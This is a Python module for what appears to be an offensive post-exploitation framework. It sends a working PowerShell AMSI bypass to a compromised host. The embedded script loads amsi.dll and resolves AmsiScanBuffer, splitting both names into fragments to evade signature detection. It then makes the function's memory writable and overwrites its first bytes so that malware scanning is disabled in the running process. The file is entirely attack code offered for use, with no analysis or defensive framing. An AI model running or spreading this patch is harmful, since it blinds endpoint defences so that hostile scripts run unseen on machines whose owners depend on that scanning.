from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "amsi-scanbuffer",
                       "Description": "Bypass Amsi ",
                       "Reference": "https://github.com/rasta-mouse/AmsiScanBufferBypass",
                       "Author": "Victor Rodriguez"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function amsi-scanbuffer {
        $Win32 = @"
        using System;
        using System.Runtime.InteropServices;
        public class Win32 {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
"@

        Add-Type $Win32
        $LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
        $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
        $p = 0
        [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
        $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
        [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
        echo "patch!"
        }            """

        function += 'amsi-scanbuffer'
        super(CustomModule, self).run(function)
